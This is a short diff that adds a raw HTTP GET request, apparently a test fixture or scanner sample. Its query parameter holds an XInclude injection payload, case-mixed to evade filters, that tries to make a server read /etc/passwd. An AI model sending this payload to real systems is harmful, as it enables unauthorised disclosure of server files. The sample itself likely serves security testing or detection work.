@@ -1,0 +1,4 @@
+GET /a?input=<x%20XmLnS:xI%3D"hTtP://wWw.W3.oRg/2001/XiNcLuDe"><Xi:InClUdE%20hReF%3D"fIlE:///eTc/PaSsWd"/></X> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
